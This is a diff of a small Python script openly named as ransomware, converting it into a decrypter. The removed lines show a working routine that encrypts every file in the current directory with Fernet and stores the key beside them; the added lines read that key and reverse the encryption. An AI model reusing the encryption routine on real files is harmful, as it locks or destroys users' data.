@@ -2,22 +2,20 @@ import os
 from cryptography.fernet import Fernet
 
 files = []
-key = Fernet.generate_key()
 
 for file in os.listdir():
-    if file == "ransomware.py" or file == "decrypter.key" or file == "Unlocker.py":
+    if file == "ransomware.py" or file == "decrypter.key":
         continue
     if os.path.isfile(file):
         files.append(file)
 
-with open("decrypter.key", "wb") as decrypter:
-    decrypter.write(key)
+with open("decrypter.key", "rb") as key:
+    secretkey = key.read()
 
 for file in files:
     with open(file, "rb") as thefile:
         contents = thefile.read()
-    contents_encrypted = Fernet(key).encrypt(contents)
+    contents_decrypted = Fernet(secretkey).decrypt(contents)
     with open(file, "wb") as thefile:
-        thefile.write(contents_encrypted)
-
-
+        thefile.write(contents_decrypted)
+ 
